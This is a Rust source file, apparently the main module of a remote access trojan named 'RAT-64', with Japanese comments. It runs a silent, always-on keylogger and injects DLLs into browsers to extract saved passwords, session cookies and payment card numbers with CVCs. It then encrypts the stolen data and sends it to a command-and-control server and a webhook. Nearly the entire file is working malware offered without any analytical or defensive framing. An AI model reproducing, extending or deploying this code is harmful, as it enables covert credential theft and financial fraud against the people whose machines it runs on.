// RAT-64 - 常時キーロガー動作版
use rmp_serde::encode::to_vec as to_msgpack_vec;
use rat_64::{
    encrypt_data_with_key, generate_key_pair, load_config_or_default, IntegratedPayload, 
    send_unified_webhook, C2Client
};
use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
use serde::{Deserialize, Serialize};
use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
use tokio::time::{sleep, Duration};

#[cfg(windows)]
use rat_64::services::{BrowserInjector, BrowserData};

// DLL IPCデータ構造
#[derive(Serialize, Deserialize)]
struct CookieOut {
    host: String,
    name: String,
    path: String,
    value: String,
    expires: i64,
    secure: bool,
    #[serde(rename = "httpOnly")]
    http_only: bool,
}

#[derive(Serialize, Deserialize)]
struct PasswordOut {
    origin: String,
    username: String,
    password: String,
}

#[derive(Serialize, Deserialize)]
struct PaymentOut {
    name_on_card: String,
    expiration_month: i64,
    expiration_year: i64,
    card_number: String,
    cvc: String,
}

#[derive(Serialize, Deserialize)]
struct ChromeDecryptData {
    browser_name: String,
    profile_name: String,
    cookies: Vec<CookieOut>,
    passwords: Vec<PasswordOut>,
    payments: Vec<PaymentOut>,
}

#[derive(Serialize, Deserialize)]
struct ChromeDecryptResult {
    browser_type: String,
    profiles: Vec<ChromeDecryptData>,
    total_cookies: usize,
    total_passwords: usize,
    total_payments: usize,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // サイレント起動
    let config = load_config_or_default();
    let mut c2_client = C2Client::new(config.clone());
    
    // 常時動作フラグ
    let running = Arc::new(AtomicBool::new(true));
    let running_clone = running.clone();
    
    // Ctrl+C ハンドラー（サイレント）
    tokio::spawn(async move {
        tokio::signal::ctrl_c().await.expect("Failed to listen for ctrl-c");
        running_clone.store(false, Ordering::Relaxed);
    });
    
    // 常時キーロガータスク
    let keylogger_running = running.clone();
    let keylogger_task = tokio::spawn(async move {
        continuous_keylogger(keylogger_running).await;
    });
    
    // 初回データ収集
    perform_initial_data_collection(&config, &mut c2_client).await?;
    
    // C2クライアントタスク（サイレント）
    let c2_task = if config.command_server_enabled {
        let c2_running = running.clone();
        Some(tokio::spawn(async move {
            while c2_running.load(Ordering::Relaxed) {
                if let Err(_) = c2_client.start_c2_loop().await {
                    // サイレント - エラー出力なし
                    sleep(Duration::from_secs(10)).await;
                }
            }
        }))
    } else {
        None
    };
    
    // メインループ - キーロガーの完了を待機
    keylogger_task.await?;
    
    // C2タスクがあれば終了を待機
    if let Some(task) = c2_task {
        task.abort();
    }
    
    // 最終セッション保存（サイレント）
    #[cfg(windows)]
    {
        use rat_64::save_session_to_file;
        let _ = save_session_to_file();
    }
    
    Ok(())
}

/// 完全常時キーロガー実行（休憩なし）
#[cfg(windows)]
async fn continuous_keylogger(running: Arc<AtomicBool>) {
    use rat_64::{save_session_to_file, get_statistics};
    use rat_64::collectors::key_mouse_logger::{collect_input_events_for, InputEvent};
    use std::sync::{Arc, Mutex};
    use std::collections::VecDeque;
    
    // サイレント起動
    
    // リアルタイムイベントバッファ
    let event_buffer: Arc<Mutex<VecDeque<InputEvent>>> = Arc::new(Mutex::new(VecDeque::new()));
    let _buffer_clone = event_buffer.clone();
    let running_clone = running.clone();
    
    // バックグラウンドでの定期保存タスク
    let save_task = tokio::spawn(async move {
        let mut save_count = 0;
        while running_clone.load(Ordering::Relaxed) {
            sleep(Duration::from_secs(30)).await; // 30秒ごとに保存
            
            save_count += 1;
            if let Err(e) = save_session_to_file() {
                eprintln!("❌ Auto-save #{} error: {}", save_count, e);
            } else {
                println!("� Auto-save #{} completed", save_count);
                
                // 統計情報表示
                if let Some(stats) = get_statistics() {
                    println!("   📈 Total: {}keys, {}clicks", 
                        stats.total_keystrokes, stats.total_mouse_clicks);
                }
            }
        }
    });
    
    // メインキーロガーループ - 完全連続動作
    let mut _total_events = 0;
    while running.load(Ordering::Relaxed) {
        // 1秒間のキャプチャ（短時間で連続実行）
        let events_text = tokio::task::spawn_blocking(|| {
            collect_input_events_for(1000) // 1秒間
        }).await.unwrap_or_default();
        
        if !events_text.is_empty() {
            _total_events += events_text.len();
            // サイレント動作（イベントごとの出力なし）
        }
        
        // 休憩完全削除 - 即座に次のキャプチャ（高速連続動作）
    }
    
    // 保存タスクを停止
    save_task.abort();
    
    // 最終保存（サイレント）
    let _ = save_session_to_file();
}

#[cfg(not(windows))]
async fn continuous_keylogger(running: Arc<AtomicBool>) {
    // サイレント待機
    while running.load(Ordering::Relaxed) {
        sleep(Duration::from_secs(10)).await;
    }
}

/// 初回データ収集（簡略化版・最適化）
async fn perform_initial_data_collection(
    config: &rat_64::Config,
    c2_client: &mut C2Client,
) -> Result<(), Box<dyn std::error::Error>> {
    // DLL経由ブラウザ収集とメインペイロード作成を並列化して待ち時間を短縮
    #[cfg(windows)]
    let (dll_browser_data, mut payload) = {
        let dll_fut = collect_browser_data_via_dll();
        let payload_fut = IntegratedPayload::create_with_config(&config);
        let (dll_res, payload_res) = tokio::join!(dll_fut, payload_fut);
        (dll_res, payload_res?)
    };

    #[cfg(not(windows))]
    let (dll_browser_data, mut payload) = {
        let dll_res = collect_browser_data_via_dll().await;
        let payload = IntegratedPayload::create_with_config(&config).await?;
        (dll_res, payload)
    };

    // DLL注入データ統合（取得できた場合のみ）
    #[cfg(windows)]
    if let Some(dll_data) = dll_browser_data.as_ref() {
        integrate_dll_browser_data(&mut payload, dll_data);
    }

    // データ暗号化・保存・送信
    process_and_save_data(payload, config, c2_client).await?;
    Ok(())
}

/// ブラウザDLL注入でデータ収集（Windows専用）
#[cfg(windows)]
async fn collect_browser_data_via_dll() -> Option<BrowserData> {
    // 従来のDLL注入とIPC受信を組み合わせ
    match BrowserInjector::new() {
        Ok(injector) => {
            // IPCサーバーとDLL注入の並行実行
            
            // IPCサーバーをバックグラウンドで開始
            let ipc_handle = tokio::spawn(async {
                receive_ipc_data().await
            });
            
            // 少し待ってからDLL注入を開始
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            
            // DLL注入を実行
            match injector.inject_all_browsers().await {
                Ok(mut browser_data) => {
                    // IPCデータの受信を待機（タイムアウト付き）
                    match tokio::time::timeout(
                        tokio::time::Duration::from_secs(10),
                        ipc_handle
                    ).await {
                        Ok(Ok(Some(ipc_result))) => {
                            integrate_ipc_data(&mut browser_data, &ipc_result);
                        }
                        Ok(Ok(None)) => {}
                        Ok(Err(_)) => {}
                        Err(_) => {}
                    }
                    
                    Some(browser_data)
                }
                Err(_) => {
                    None
                }
            }
        },
        Err(_) => {
            // サイレント エラー処理
            None
        }
    }
}

#[cfg(not(windows))]
async fn collect_browser_data_via_dll() -> Option<()> {
    None
}

/// Windows名前付きパイプサーバーでDLLからIPCデータを受信
#[cfg(windows)]
async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
    use std::ffi::c_void;
    use std::ptr;
    
    // Windows API定義
    #[link(name = "kernel32")]
    extern "system" {
        fn CreateNamedPipeW(
            lpName: *const u16,
            dwOpenMode: u32,
            dwPipeMode: u32,
            nMaxInstances: u32,
            nOutBufferSize: u32,
            nInBufferSize: u32,
            nDefaultTimeOut: u32,
            lpSecurityAttributes: *mut c_void,
        ) -> *mut c_void;
        fn ConnectNamedPipe(hNamedPipe: *mut c_void, lpOverlapped: *mut c_void) -> i32;
        fn ReadFile(
            hFile: *mut c_void,
            lpBuffer: *mut c_void,
            nNumberOfBytesToRead: u32,
            lpNumberOfBytesRead: *mut u32,
            lpOverlapped: *mut c_void,
        ) -> i32;
        fn CloseHandle(hObject: *mut c_void) -> i32;
        fn GetLastError() -> u32;
    }
    
    const PIPE_ACCESS_INBOUND: u32 = 0x00000001;
    const PIPE_TYPE_BYTE: u32 = 0x00000000;
    const PIPE_READMODE_BYTE: u32 = 0x00000000;
    const PIPE_WAIT: u32 = 0x00000000;
    const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;
    
    // パイプ名をワイド文字に変換
    let pipe_name = "\\\\.\\pipe\\rat64_chrome_data\0".encode_utf16().collect::<Vec<u16>>();
    
    unsafe {
        let pipe_handle = CreateNamedPipeW(
            pipe_name.as_ptr(),
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1,
            0,
            65536, // 64KB受信バッファ
            0,
            ptr::null_mut(),
        );
        
        if pipe_handle == INVALID_HANDLE_VALUE {
            return None;
        }
        
        // DLLからの接続を待機（タイムアウト設定）
        let result = ConnectNamedPipe(pipe_handle, ptr::null_mut());
        if result == 0 {
            let error = GetLastError();
            // ERROR_PIPE_CONNECTED (535) は既に接続済みを意味する
            if error != 535 {
                CloseHandle(pipe_handle);
                return None;
            }
        }
        
        // データ受信
        let mut buffer = vec![0u8; 1024 * 1024]; // 1MB受信バッファ
        let mut bytes_read = 0u32;
        
        if ReadFile(
            pipe_handle,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.len() as u32,
            &mut bytes_read,
            ptr::null_mut(),
        ) == 0 {
            CloseHandle(pipe_handle);
            return None;
        }
        
        CloseHandle(pipe_handle);
        
        if bytes_read > 0 {
            buffer.truncate(bytes_read as usize);
            let json_data = String::from_utf8_lossy(&buffer);
            
            match serde_json::from_str::<ChromeDecryptResult>(&json_data) {
                Ok(result) => {
                    Some(result)
                }
                Err(_) => {
                    None
                }
            }
        } else {
            None
        }
    }
}

/// IPCで受信したDLLデータをBrowserDataに統合
#[cfg(windows)]
fn integrate_ipc_data(browser_data: &mut BrowserData, ipc_result: &ChromeDecryptResult) {
    use rat_64::services::{DllPasswordOut, DllCookieOut, DllPaymentOut};
    
    for profile in &ipc_result.profiles {
        // パスワード統合
        for password in &profile.passwords {
            browser_data.passwords.push(DllPasswordOut {
                origin: format!("[IPC_{}] {}", profile.browser_name, password.origin),
                username: password.username.clone(),
                password: password.password.clone(),
            });
        }
        
        // クッキー統合
        for cookie in &profile.cookies {
            browser_data.cookies.push(DllCookieOut {
                host: format!("[IPC_{}] {}", profile.browser_name, cookie.host),
                name: cookie.name.clone(),
                path: cookie.path.clone(),
                value: cookie.value.clone(),
                expires: cookie.expires,
                secure: cookie.secure,
                http_only: cookie.http_only,
            });
        }
        
        // 支払い情報統合
        for payment in &profile.payments {
            browser_data.payments.push(DllPaymentOut {
                name_on_card: format!("[IPC_{}] {}", profile.browser_name, payment.name_on_card),
                expiration_month: payment.expiration_month,
                expiration_year: payment.expiration_year,
                card_number: payment.card_number.clone(),
                cvc: payment.cvc.clone(),
            });
        }
    }
    

}

/// DLL注入で収集したブラウザデータをメインペイロードに統合
#[cfg(windows)]
fn integrate_dll_browser_data(payload: &mut IntegratedPayload, dll_data: &BrowserData) {
    
    // パスワード統合
    for password in &dll_data.passwords {
        payload.auth_data.passwords.push(format!(
            "[DLL_DECRYPTED] {}|{}|{}", 
            password.origin, password.username, password.password
        ));
    }
    
    // クッキー統合
    for cookie in &dll_data.cookies {
        payload.auth_data.passwords.push(format!(
            "[DLL_COOKIE] {}|{}|{}", 
            cookie.host, cookie.name, cookie.value
        ));
    }
    
    // 支払い情報統合
    for payment in &dll_data.payments {
        payload.auth_data.passwords.push(format!(
            "[DLL_PAYMENT] {}|{}|{}|{}", 
            payment.card_number, payment.name_on_card, 
            payment.expiration_month, payment.expiration_year
        ));
    }
    

}



/// データの暗号化・保存・送信処理
async fn process_and_save_data(
    mut payload: rat_64::IntegratedPayload, 
    config: &rat_64::Config, 
    c2_client: &mut C2Client
) -> Result<(), Box<dyn std::error::Error>> {
    let serialized = to_msgpack_vec(&payload)?;
    let (key, nonce) = generate_key_pair();
    let encrypted = encrypt_data_with_key(&serialized, &key, &nonce)?;
    payload.update_encryption_info(&key, &nonce);
    
    // キー/ナンス情報をファイルに保存
    let key_b64 = STANDARD_NO_PAD.encode(&key);
    let nonce_b64 = STANDARD_NO_PAD.encode(&nonce);
    std::fs::write("key.txt", &key_b64)?;
    std::fs::write("nonce.txt", &nonce_b64)?;
    
    // C2アップロードとWebhook送信を可能なら並列化
    let upload_enabled = config.command_server_enabled;
    let webhook_enabled = config.webhook_enabled && !config.webhook_url.trim().is_empty();

    // ファイル保存
    std::fs::write("data.dat", &encrypted)?;

    match (upload_enabled, webhook_enabled) {
        (true, true) => {
            let _ = tokio::join!(
                c2_client.upload_collected_data(&payload),
                send_unified_webhook(&payload, &config)
            );
        }
        (true, false) => {
            let _ = c2_client.upload_collected_data(&payload).await;
        }
        (false, true) => {
            let _ = send_unified_webhook(&payload, &config).await;
        }
        (false, false) => {}
    }
    
    Ok(())
}

// 非Windows環境用のダミー実装
#[cfg(not(windows))]
fn is_admin() -> bool {
    false // Unix系では簡単にはチェックできないため false を返す
}
